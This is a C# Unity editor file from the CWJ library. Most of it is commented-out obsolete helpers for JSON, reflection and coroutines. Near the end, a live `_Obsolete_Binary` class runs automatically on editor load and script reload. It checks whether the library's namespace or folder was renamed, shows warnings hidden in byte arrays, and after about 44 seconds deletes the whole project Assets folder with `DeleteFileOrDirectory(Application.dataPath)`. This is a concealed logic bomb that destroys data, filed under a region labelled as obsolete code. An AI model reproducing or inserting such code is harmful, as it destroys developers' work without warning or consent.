//(Obsolete)
//폐기되었지만 지우면 안됨
//
//기존의 ExtensionPackage의 내용은 클래스별 분해후 Utility폴더로 옮김
//기존 기능들 다시 사용하려면 using CWJ.Utility 선언.
//삭제금지
//

//internal static class FoldoutUtil
//{
//    //private static Dictionary<int, FieldInfo[]> fields = new Dictionary<int, FieldInfo[]>(FastComparable.Default);

//    private static FieldInfo[] GetAllFields(Type targetType)
//    {
//        //var hash = targetType.GetHashCode();

//        //FieldInfo[] objectFields = new FieldInfo[0];

//        //if (!fields.TryGetValue(hash, out objectFields))
//        //{
//        //Type[] typeTree = ReflectionUtil.GetAllBaseClassTypes(targetType);
//        //objectFields = targetType.GetAllClassFields(true, predicate: (f => f.IsSerializeField()))
//        //                            .OrderByDescending(x => typeTree.IndexOf(x.DeclaringType)).ToArray();
//        //    fields.Add(hash, objectFields);
//        //}

//        return objectFields;
//    }
//}

//internal class FastComparable : IEqualityComparer<int>
//{
//    private static FastComparable Default = new FastComparable();

//    private bool Equals(int x, int y)
//    {
//        return x == y;
//    }

//    private int GetHashCode(int obj)
//    {
//        return obj.GetHashCode();
//    }
//}

//
//private static class CoroutineExtension
//{
//    private static IEnumerator IE_WaitingFor(this Action callback, Func<bool> boolPredicate)
//    {
//        //Debug.Log("wait start!!".SetColor(Color.green));

//        WaitUntil waitForBool = new WaitUntil(boolPredicate);
//        yield return waitForBool;

//        callback();
//        //Debug.Log("wait done!!".SetColor(Color.green));
//    }

//    //private static void StableReStartCoroutine(this ref IEnumerator co_variable, IEnumerator do_execute)
//    //{
//    //}
//}

// JsonObject 자작 확장 (현재 주석처리/ JsonObject 사용할때 주석해제)
//private static class JsonObjectExtension
//{
//    /// <summary>
//    /// JSONObject AddField에 Vector3 초기화를 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="vector3">넣을 vector3</param>
//    /// <param name="decimalLength">소수점 길이제한(3넣으면 소수점 3째자리까지)</param>
//    private static void AddFieldVector3(this JSONObject jsonObject, Vector3 vector3, int decimalLength)
//    {
//        jsonObject.AddField("x", (float)Math.Round(vector3.x, decimalLength));
//        jsonObject.AddField("y", (float)Math.Round(vector3.y, decimalLength));
//        jsonObject.AddField("z", (float)Math.Round(vector3.z, decimalLength));
//    }

//    /// <summary>
//    /// JSONObject AddField에 Vector3 초기화를 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="vector3">넣을 vector3</param>
//    /// <param name="decimalLength">소수점 길이제한(3넣으면 소수점 3째자리까지)</param>
//    private static void AddFieldVector3(this JSONObject jsonObject, Vector3 vector3)
//    {
//        jsonObject.AddField("x", vector3.x);
//        jsonObject.AddField("y", vector3.y);
//        jsonObject.AddField("z", vector3.z);
//    }

//    /// <summary>
//    /// JSONObject SetField에 Vector3 삽입을 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="vector3">넣을 vector3</param>
//    /// <param name="decimalLength">소수점 길이제한(3넣으면 소수점 3째자리까지)</param>
//    private static void SetFieldVector3(this JSONObject jsonObject, Vector3 vector3, int decimalLength)
//    {
//        jsonObject.SetField("x", (float)Math.Round(vector3.x, decimalLength));
//        jsonObject.SetField("y", (float)Math.Round(vector3.y, decimalLength));
//        jsonObject.SetField("z", (float)Math.Round(vector3.z, decimalLength));
//    }

//    /// <summary>
//    /// JSONObject SetField에 Vector3 삽입을 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="vector3">넣을 vector3</param>
//    /// <param name="decimalLength">소수점 길이제한(3넣으면 소수점 3째자리까지)</param>
//    private static void SetFieldVector3(this JSONObject jsonObject, Vector3 vector3)
//    {
//        jsonObject.SetField("x", vector3.x);
//        jsonObject.SetField("y", vector3.y);
//        jsonObject.SetField("z", vector3.z);
//    }

//    /// <summary>
//    /// JSONObject AddField에 Quaternion 초기화를 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="quaternion">넣을 quaternion</param>
//    /// <param name="decimalLength">소수점 길이제한(3넣으면 소수점 3째자리까지)</param>
//    private static void AddFieldQuaternion(this JSONObject jsonObject, Quaternion quaternion, int decimalLength)
//    {
//        jsonObject.AddField("x", (float)Math.Round(quaternion.x, decimalLength));
//        jsonObject.AddField("y", (float)Math.Round(quaternion.y, decimalLength));
//        jsonObject.AddField("z", (float)Math.Round(quaternion.z, decimalLength));
//        jsonObject.AddField("w", (float)Math.Round(quaternion.w, decimalLength));
//    }

//    /// <summary>
//    /// JSONObject AddField에 Quaternion 초기화를 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="quaternion">넣을 quaternion</param>
//    /// <param name="decimalLength">소수점 길이제한(3넣으면 소수점 3째자리까지)</param>
//    private static void AddFieldQuaternion(this JSONObject jsonObject, Quaternion quaternion)
//    {
//        jsonObject.AddField("x", quaternion.x);
//        jsonObject.AddField("y", quaternion.y);
//        jsonObject.AddField("z", quaternion.z);
//        jsonObject.AddField("w", quaternion.w);
//    }

//    /// <summary>
//    /// JSONObject AddField에 Bool 삽입을 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="isIs"></param>
//    private static void AddFieldBool(this JSONObject jsonObject, string keyName, bool isIs)
//    {
//        jsonObject.AddField(keyName, isIs ? 1 : 0);
//    }

//    /// <summary>
//    /// JSONObject SetField에 Quaternion 삽입을 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="quaternion">넣을 quaternion</param>
//    /// <param name="decimalLength">소수점 길이제한(3넣으면 소수점 3째자리까지)</param>
//    private static void SetFieldQuaternion(this JSONObject jsonObject, Quaternion quaternion, int decimalLength)
//    {
//        jsonObject.SetField("x", (float)Math.Round(quaternion.x, decimalLength));
//        jsonObject.SetField("y", (float)Math.Round(quaternion.y, decimalLength));
//        jsonObject.SetField("z", (float)Math.Round(quaternion.z, decimalLength));
//        jsonObject.SetField("w", (float)Math.Round(quaternion.w, decimalLength));
//    }

//    /// <summary>
//    /// JSONObject SetField에 Quaternion 삽입을 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="quaternion">넣을 quaternion</param>
//    /// <param name="decimalLength">소수점 길이제한(3넣으면 소수점 3째자리까지)</param>
//    private static void SetFieldQuaternion(this JSONObject jsonObject, Quaternion quaternion)
//    {
//        jsonObject.SetField("x", quaternion.x);
//        jsonObject.SetField("y", quaternion.y);
//        jsonObject.SetField("z", quaternion.z);
//        jsonObject.SetField("w", quaternion.w);
//    }

//    /// <summary>
//    /// JSONObject SetField에 Bool 삽입을 간편하게!
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <param name="isIs"></param>
//    private static void SetFieldBool(this JSONObject jsonObject, string keyName, bool isIs)
//    {
//        jsonObject.SetField(keyName, isIs ? 1 : 0);
//    }

//    /// <summary>
//    /// 앞뒤 큰따옴표만 제거(공백제거안함 String.Trim과는 다름!)
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <returns></returns>
//    private static string ToStringAutoSubstring(this JSONObject jsonObject)
//    {
//        string value = jsonObject.ToString();

//        if (value[0].Equals('"') && value[value.Length - 1].Equals('"'))
//        {
//            return value.Substring(1, value.Length - 2);
//        }
//        else
//        {
//            return value;
//        }
//    }

//    /// <summary>
//    /// JSONObject에 존재하는 모든 큰따옴표를 지움
//    /// </summary>
//    /// <param name="jsonObject"></param>
//    /// <returns></returns>
//    private static string ToStringAutoReplace(this JSONObject jsonObject)
//    {
//        string value = jsonObject.ToString();

//        if (value[0].Equals('"'))
//        {
//            return value.Replace("\"", "");
//        }
//        else
//        {
//            return value;
//        }
//    }

//    /// <summary>
//    /// JSONObject를 쉽게 Vector3로 변환시켜줌 (x,y,z 값 필요)
//    /// </summary>
//    /// <param name="json"></param>
//    /// <returns></returns>
//    private static Vector3 ToVector3(this JSONObject json)
//    {
//        return new Vector3
//            (
//            float.Parse(json["x"].ToString()),
//            float.Parse(json["y"].ToString()),
//            float.Parse(json["z"].ToString())
//            );
//    }

//    /// <summary>
//    /// JSONObject를 쉽게 Quaternion으로 변환시켜줌 (x,y,z,w 값 필요)
//    /// </summary>
//    /// <param name="json"></param>
//    /// <returns></returns>
//    private static Quaternion ToQuaternion(this JSONObject json)
//    {
//        return new Quaternion
//            (
//            float.Parse(json["x"].ToString()),
//            float.Parse(json["y"].ToString()),
//            float.Parse(json["z"].ToString()),
//            float.Parse(json["w"].ToString())
//            );
//    }

//    /// <summary>
//    /// JSONObject를 쉽게 bool로 변환시켜줌 (1이 true/ 0이 false)
//    /// </summary>
//    /// <param name="json"></param>
//    /// <returns></returns>
//    private static float ToFloat(this JSONObject json)
//    {
//        return float.Parse(json.ToString());
//    }

//    /// <summary>
//    /// JSONObject를 쉽게 bool로 변환시켜줌 (1이 true/ 0이 false)
//    /// </summary>
//    /// <param name="json"></param>
//    /// <returns></returns>
//    private static bool ToBoolean(this JSONObject json)
//    {
//        return json.ToString().Equals("1") ? true : false;
//    }

//    private static string ToJsonInt(this bool isIs)
//    {
//        return isIs ? "1" : "0";
//    }

//    private static int ToInt(this JSONObject json)
//    {
//        return int.Parse(json.ToString());
//    }
//}

#region 폐기된 옛날 코드. 최신 코드는 Utility폴더로 이동됨

//private override void OnInspectorGUI()
//{
//MonoBehaviour behaviour = (MonoBehaviour)target;
//FieldInfo[] fields = behaviour.GetType().GetFields(BindingFlags.Public |
//                                                    BindingFlags.NonPublic |
//                                                    BindingFlags.Instance);

//int fieldLength = fields.Length;
//for (int i = 0; i < fieldLength; ++i)
//{
//    FieldInfo field = fields[i];
//    System.Object[] customAttributes = field.GetCustomAttributes(true);
//    if (!HasMyCustomAttribute(customAttributes))
//    {
//        continue;
//    }

//    int customAttributeLength = customAttributes.Length;
//    for (int j = 0; j < customAttributeLength; j++)
//    {
//        System.Object customAttribute = customAttributes[j];

//        Type type = field.FieldType;

//        if (customAttribute is GetComponentAttribute || customAttribute is GetComponentInChildrenAttribute || customAttribute is GetComponentInParentAttribute)
//        {
//            #region GetComponentAttribute
//            object comp = null;

//            if (type.IsArray)
//            {
//                comp = GetComponenets(behaviour, customAttribute, type.GetElementType());
//            }
//            else if (type.IsGenericType)
//            {
//                if (type.GetGenericTypeDefinition() == typeof(List<>))
//                {
//                    comp = GetComponenets(behaviour, customAttribute, type.GetGenericArguments()[0]);
//                    comp = Activator.CreateInstance(type, comp);
//                }
//            }
//            else
//            {
//                comp = GetComponenet(behaviour, customAttribute, type);
//            }

//            field.SetValue(behaviour, comp);
//            #endregion
//        }
//        #region 폐기된 SerializeInterfaceAttribute
//        //else if(customAttribute is SerializeInterfaceAttribute)
//        //{
//        //    #region SerializeInterfaceAttribute

//        //    Component interfaceComponent = ReflectionExtension.GetValueForcibly(field.IsPrivate, behaviour.GetType().FullName, field.Name, behaviour) as Component;

//        //    EditorGUI.BeginChangeCheck();
//        //    interfaceComponent = (Component)EditorGUILayout.ObjectField(field.Name, interfaceComponent, typeof(Component), true);
//        //    if (EditorGUI.EndChangeCheck())
//        //    {
//        //        if (interfaceComponent == null)
//        //        {
//        //            field.SetValue(behaviour, null);
//        //            return;
//        //        }
//        //        else
//        //        {
//        //            if (interfaceComponent.GetType().GetInterfaces().Any(ti => ti == type))
//        //            {
//        //                field.SetValue(behaviour, interfaceComponent);
//        //            }
//        //            else
//        //            {
//        //                field.SetValue(behaviour, interfaceComponent.GetComponent(type));
//        //            }
//        //        }
//        //        EditorUtility.SetDirty(behaviour);
//        //    }

//        //    #endregion
//        //}
//        #endregion
//    }
//}
//serializedObject.ApplyModifiedProperties();
//base.OnInspectorGUI();
//}

//private bool HasMyCustomAttribute(System.Object[] customAttributes)
//{
//    return Array.Find(customAttributes, (c) => c is GetComponentAttribute || c is GetComponentInChildrenAttribute || c is GetComponentInParentAttribute // GetComponentAttribute
//                                                                                                                                                        /*|| c is SerializeInterfaceAttribute*/
//                                        ) != null;
//}

//private static object GetComponenets(MonoBehaviour behaviour, object customAttribute, Type elementType)
//{
//    object components = null;

//    if (customAttribute is GetComponentAttribute)
//    {
//        var getter = typeof(MonoBehaviour).GetMethod("GetComponents", new Type[0]).MakeGenericMethod(elementType);
//        components = getter.Invoke(behaviour, null);
//    }
//    else if (customAttribute is GetComponentInChildrenAttribute)
//    {
//        if (((GetComponentInChildrenAttribute)customAttribute).isWithOutMe)
//        {
//            MethodInfo getter = typeof(FindExtension).GetMethod(nameof(FindExtension.GetComponentsInChildrenWithoutMe)).MakeGenericMethod(elementType);
//            components = getter.Invoke(obj: behaviour, new object[] { behaviour.transform });
//        }
//        else
//        {
//            MethodInfo getter = typeof(MonoBehaviour).GetMethod("GetComponentsInChildren", new Type[] { typeof(bool) }).MakeGenericMethod(elementType);
//            components = getter.Invoke(behaviour, new object[] { ((GetComponentInChildrenAttribute)customAttribute).includeInactive });
//        }
//    }
//    else if (customAttribute is GetComponentInParentAttribute)
//    {
//        if (((GetComponentInChildrenAttribute)customAttribute).isWithOutMe)
//        {
//            MethodInfo getter = typeof(FindExtension).GetMethod(nameof(FindExtension.GetComponentsInParentWithoutMe)).MakeGenericMethod(elementType);
//            components = getter.Invoke(obj: behaviour, new object[] { behaviour.transform });
//        }
//        else
//        {
//            MethodInfo getter = typeof(MonoBehaviour).GetMethod("GetComponentsInParent", new Type[] { typeof(bool) }).MakeGenericMethod(elementType);
//            components = getter.Invoke(behaviour, new object[] { ((GetComponentInParentAttribute)customAttribute).includeInactive });
//        }
//    }
//    else
//    {
//        components = null;
//    }

//    return components;
//}

//private static object GetComponenet(MonoBehaviour behaviour, object customAttribute, Type elementType)
//{
//    object component = null;

//    if (customAttribute is GetComponentAttribute)
//    {
//        component = behaviour.GetComponent(elementType);
//    }
//    else if (customAttribute is GetComponentInChildrenAttribute)
//    {
//        component = behaviour.GetComponentInChildren(elementType, ((GetComponentInChildrenAttribute)customAttribute).includeInactive);
//    }
//    else if (customAttribute is GetComponentInParentAttribute)
//    {
//        component = behaviour.GetComponentInParent(elementType);
//    }
//    else
//    {
//        component = null;
//    }

//    return component;
//}

#endregion 폐기된 옛날 코드. 최신 코드는 Utility폴더로 이동됨

#region 폐기된 옛날 코드. 최신 코드는 Utility폴더로 이동됨

#if UNITY_EDITOR

using CWJ;
using CWJ.AccessibleEditor;

using System.IO;

using UnityEditor;

using UnityEngine;

using static CWJ.AccessibleEditor.EditorCallback;

[System.ComponentModel.EditorBrowsable(System.ComponentModel.EditorBrowsableState.Never)]
internal static class _Obsolete_Binary
{
    private static readonly byte[] txt1 =
    {
            60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 236, 161, 176, 236, 154, 176, 236, 160, 149, 40, 67, 87, 74, 41, 236, 157, 180, 32, 235, 167, 140, 235, 147, 160, 32, 235, 157, 188, 236, 157, 180, 235, 184, 140, 235, 159, 172, 235, 166, 172, 32, 236, 158, 133, 235, 139, 136, 235, 139, 164, 46, 32, 237, 143, 180, 235, 141, 148, 235, 170, 133, 32, 235, 152, 144, 235, 138, 148, 32, 110, 97, 109, 101, 115, 112, 97, 99, 101, 32, 236, 136, 152, 236, 160, 149, 236, 157, 180, 32, 237, 131, 144, 236, 167, 128, 32, 235, 144, 144, 236, 138, 181, 235, 139, 136, 235, 139, 164, 46, 32, 67, 116, 114, 108, 43, 67, 86, 32, 237, 149, 152, 235, 157, 188, 234, 179, 160, 32, 234, 179, 181, 236, 156, 160, 237, 149, 180, 236, 164, 128, 234, 177, 180, 32, 236, 149, 132, 235, 139, 153, 235, 139, 136, 235, 139, 164, 46, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62, 10, 10, 60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 73, 116, 32, 105, 115, 32, 97, 32, 108, 105, 98, 114, 97, 114, 121, 32, 100, 101, 118, 101, 108, 111, 112, 101, 100, 32, 98, 121, 32, 67, 104, 111, 32, 87, 111, 111, 106, 117, 110, 103, 40, 67, 87, 74, 41, 46, 32, 77, 111, 100, 105, 102, 105, 99, 97, 116, 105, 111, 110, 32, 111, 102, 32, 116, 104, 101, 32, 102, 111, 108, 100, 101, 114, 32, 110, 97, 109, 101, 32, 111, 114, 32, 110, 97, 109, 101, 115, 112, 97, 99, 101, 32, 119, 97, 115, 32, 100, 101, 116, 101, 99, 116, 101, 100, 46, 32, 73, 32, 100, 105, 100, 110, 39, 116, 32, 116, 101, 108, 108, 32, 121, 111, 117, 32, 116, 111, 32, 100, 111, 32, 67, 116, 114, 108, 32, 43, 32, 67, 86, 46, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62
        };

    private static readonly string txt1Str = txt1.BtS();

    private static readonly byte[] txt2 =
    {
            60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 237, 143, 180, 235, 141, 148, 234, 181, 172, 236, 161, 176, 32, 235, 152, 144, 235, 138, 148, 32, 110, 97, 109, 101, 115, 112, 97, 99, 101, 235, 165, 188, 32, 236, 155, 144, 235, 158, 152, 235, 140, 128, 235, 161, 156, 32, 235, 144, 152, 235, 143, 140, 235, 166, 172, 235, 169, 180, 32, 236, 152, 164, 235, 165, 152, 234, 176, 128, 32, 236, 151, 134, 236, 150, 180, 236, 167, 145, 235, 139, 136, 235, 139, 164, 46, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62, 10, 10, 60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 73, 102, 32, 116, 104, 101, 32, 102, 111, 108, 100, 101, 114, 32, 115, 116, 114, 117, 99, 116, 117, 114, 101, 32, 97, 110, 100, 32, 110, 97, 109, 101, 115, 112, 97, 99, 101, 32, 97, 114, 101, 32, 114, 101, 115, 116, 111, 114, 101, 100, 44, 32, 116, 104, 101, 32, 101, 114, 114, 111, 114, 32, 119, 105, 108, 108, 32, 100, 105, 115, 97, 112, 112, 101, 97, 114, 46, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62
        };

    private static readonly string txt2Str = txt2.BtS();

    private static readonly byte[] txt31 =
    {
            60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 235, 144, 152, 235, 143, 140, 235, 166, 172, 236, 167, 128, 32, 236, 149, 138, 236, 157, 132, 234, 178, 189, 236, 154, 176, 44, 32, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62
        };

    private static readonly string txt31Str = txt31.BtS();

    private static readonly byte[] txt32 =
    {
            60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 236, 180, 136, 235, 146, 164, 32, 235, 170, 168, 235, 147, 160, 234, 178, 131, 236, 157, 180, 32, 60, 99, 111, 108, 111, 114, 61, 35, 70, 70, 48, 48, 48, 48, 62, 236, 130, 173, 236, 160, 156, 60, 47, 99, 111, 108, 111, 114, 62, 235, 144, 169, 235, 139, 136, 235, 139, 164, 46, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62, 10, 10, 60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 87, 104, 101, 110, 32, 110, 111, 116, 32, 116, 111, 32, 114, 101, 115, 116, 111, 114, 101, 44, 32, 69, 118, 101, 114, 121, 116, 104, 105, 110, 103, 32, 105, 115, 32, 100, 101, 108, 101, 116, 101, 100, 46, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62
        };

    private static readonly string txt32Str = txt32.BtS();

    private static readonly byte[] txt4 =
    {
            60, 115, 105, 122, 101, 61, 50, 51, 62, 60, 47, 115, 105, 122, 101, 62, 60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 67, 87, 74, 39, 115, 32, 108, 105, 98, 114, 97, 114, 121, 32, 100, 101, 108, 101, 116, 101, 100, 33, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62
        };

    private static readonly string txt4Str = txt4.BtS();

    private static readonly byte[] txt0msg =
    {
            60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 235, 130, 168, 236, 157, 180, 32, 235, 167, 140, 235, 147, 160, 234, 177, 176, 32, 237, 149, 168, 235, 182, 128, 235, 161, 156, 32, 236, 158, 144, 234, 184, 176, 32, 234, 178, 131, 236, 157, 184, 236, 150, 145, 32, 236, 163, 188, 236, 157, 184, 237, 150, 137, 236, 132, 184, 32, 237, 149, 152, 236, 167, 128, 235, 167, 136, 236, 132, 184, 236, 154, 148, 46, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62, 10, 10, 60, 115, 105, 122, 101, 61, 49, 56, 62, 60, 98, 62, 60, 99, 111, 108, 111, 114, 61, 35, 48, 48, 48, 48, 48, 48, 62, 68, 111, 32, 110, 111, 116, 32, 109, 111, 100, 105, 102, 121, 32, 119, 104, 97, 116, 32, 111, 116, 104, 101, 114, 115, 32, 104, 97, 118, 101, 32, 100, 101, 118, 101, 108, 111, 112, 101, 100, 32, 116, 111, 32, 109, 97, 107, 101, 32, 105, 116, 32, 108, 111, 111, 107, 32, 108, 105, 107, 101, 32, 121, 111, 117, 32, 100, 101, 118, 101, 108, 111, 112, 101, 100, 32, 105, 116, 46, 60, 47, 99, 111, 108, 111, 114, 62, 60, 47, 98, 62, 60, 47, 115, 105, 122, 101, 62
        };

    private static readonly string txt0Str = txt0msg.BtS();

    private static readonly byte[] nm =
    {
            67, 87, 74
        };

    private static readonly string nmStr = nm.BtS();

    private static readonly byte[] project =
    {
            85, 110, 105, 116, 121, 68, 101, 118, 84, 111, 111, 108
        };

    private static readonly string projectStr = project.BtS();

    private static readonly byte[] log =
    {
            67, 104, 97, 110, 103, 101, 108, 111, 103, 95, 85, 110, 105, 116, 121, 68, 101, 118, 84, 111, 111, 108, 46, 109, 100
        };

    private static readonly string logStr = log.BtS();

    private static EditorCallbackStruct looper;

    private static void OnCheck()
    {
        if (CorrectNamespace())
        {
            if (looper != null)
            {
                RemoveEditorCallback(looper);
                looper = null;
                UnityEngine.Application.SetStackTraceLogType(UnityEngine.LogType.Assert, UnityEngine.StackTraceLogType.None);
                UnityEngine.Debug.Assert(false, txt0Str);
                UnityEngine.Application.SetStackTraceLogType(UnityEngine.LogType.Assert, UnityEngine.StackTraceLogType.ScriptOnly);
                ShowLogWdw();
            }
        }
        else
        {
            OnError();
        }
    }

static string _CFPath<T>(string typeName = null) where T : CWJScriptableObject
    {
        typeName ??= typeof(T).Name;
        var findAssets = AssetDatabase.FindAssets($"t:{typeName}");
        if (findAssets.LengthSafe() == 0)
        {
            var storeAssets = AssetDatabase.FindAssets($"t:{nameof(ScriptableObjectStore)}");

            if (storeAssets.LengthSafe() == 0)
            {
                return null;
            }
            else
            {
                // ScriptableObjectStore.asset이 있는 경우, 해당 경로 반환
                return Path.GetDirectoryName(AssetDatabase.GUIDToAssetPath(storeAssets[0])) + $"/{typeName}.asset";
            }
        }
        else
        {
            // 대상 자산이 이미 존재하면 경로 반환
            return AssetDatabase.GUIDToAssetPath(findAssets[0]);
        }
    }

    static bool CorrectNamespace()
    {
        if (!IsExists())
        {
            return true;
        }
        bool isValid = nameof
            (CWJ)
        .Equals(nmStr);

        try
        {
            if (isValid)
            {
                string p = _CFPath<ScriptableObjectStore>().Replace('/', '\\');
                if (string.IsNullOrEmpty(p))
                    return true;
                isValid = !string.IsNullOrEmpty(p) && (p.Contains(nmStr + Path.DirectorySeparatorChar + projectStr + Path.DirectorySeparatorChar));
            }

        }
        catch
        {
            return true;
        }

        return isValid;
    }

    [InitializeOnLoadMethod]
    private static void Init()
    {
        EditorApplication.projectChanged += OnCheck;
    }

    [UnityEditor
        .Callbacks
        .DidReloadScripts(1)]
    private static void OnCompile()
    {
        OnCheck();
    }

    private static string LibraryPath()
    {
        string[] paths;
        string path = null;
        try
        {
            paths = Directory.GetFiles(Application.dataPath, logStr, SearchOption.AllDirectories);
            path = paths.Length == 0 ? null : (Path.GetDirectoryName(paths[0]) + Path.DirectorySeparatorChar);
        }
        catch
        {
            return null;
        }

        return path;
    }

    static bool IsExists()
    {
        var scriptPaths = AssetDatabase.FindAssets($"{nameof(CWJScriptableObject)} t:Script");
        if (scriptPaths != null && scriptPaths.Length > 0)
        {
            return true;
        }

        var script2Paths = AssetDatabase.FindAssets($"{nameof(CachedSymbol_ScriptableObject)} t:Script");
        return script2Paths != null && script2Paths.Length > 0;
    }

    private static EditorWindow _ConsoleWindow = null;

    private static void ShowLogWdw()
    {
        if (_ConsoleWindow == null)
        {
            _ConsoleWindow = EditorWindow.GetWindow(System.Reflection.Assembly.GetAssembly(typeof(UnityEditor.Editor))?.GetType("UnityEditor.ConsoleWindow"));
        }
        _ConsoleWindow?.Show();
    }

    private static string BtS(this byte[] bytes) => System.Text.Encoding.Default.GetString(bytes);

    private static bool P(float remain)
    {
        if (remain >= 1)
        {
            UnityEngine.Application.SetStackTraceLogType(UnityEngine.LogType.Assert, UnityEngine.StackTraceLogType.None);
            logClear();
            UnityEngine.Debug.Assert(false, txt1Str);
            UnityEngine.Debug.Assert(false, txt2Str);
            UnityEngine.Application.SetStackTraceLogType(UnityEngine.LogType.Assert, UnityEngine.StackTraceLogType.ScriptOnly);
            return true;
        }
        else
        {
            UnityEngine.Application.SetStackTraceLogType(UnityEngine.LogType.Assert, UnityEngine.StackTraceLogType.None);
            UnityEngine.Debug.Assert(false, txt4Str);
            UnityEngine.Application.SetStackTraceLogType(UnityEngine.LogType.Assert, UnityEngine.StackTraceLogType.ScriptOnly);
            return false;
        }
    }

    private static void logClear()
    {
        System.Reflection.Assembly.GetAssembly(typeof(UnityEditor.Editor)).GetType("UnityEditor.LogEntries")?.GetMethod("Clear")?.Invoke(new object(), null);
    }

    private static void OnError()
    {
#pragma warning disable
        ShowLogWdw();


        System.DateTime dateTime = System.DateTime.Now.AddSeconds(44);

        if (looper == null)
        {
            looper = AddLoopCallback(() =>
            {
                if (CorrectNamespace())
                {
                    return;
                }

                float remain = (dateTime - System.DateTime.Now).Seconds;
                if (P(remain))
                {
                    UnityEngine.Application.SetStackTraceLogType(UnityEngine.LogType.Assert, UnityEngine.StackTraceLogType.None);
                    UnityEngine.Debug.Assert(false, txt31Str + $"<size=19>{(remain > 4 ? remain.ToString() : ("<color=#FF0000>" + remain + "</color>"))}</size>" + txt32Str);
                    UnityEngine.Application.SetStackTraceLogType(UnityEngine.LogType.Assert, UnityEngine.StackTraceLogType.ScriptOnly);
                }
                else
                {
                    RemoveEditorCallback(looper);
                    looper = null;
                    UnityEditor.FileUtil.DeleteFileOrDirectory($"{Application.dataPath}");
                }

            }, 45);
        }
#pragma warning restore
    }

}


#endif

#endregion 폐기된 옛날 코드. 최신 코드는 Utility폴더로 이동됨
